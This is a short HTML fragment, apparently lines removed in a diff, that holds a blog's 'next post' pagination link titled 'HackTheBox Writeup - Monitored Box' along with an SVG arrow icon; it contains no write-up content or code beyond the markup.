-        <div class="pagination-single__right-title">HackTheBox Writeup - Monitored Box</div>
-        <div class="pagination-single__icon">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
-        </div>
-      </a>
     
   
 </nav>
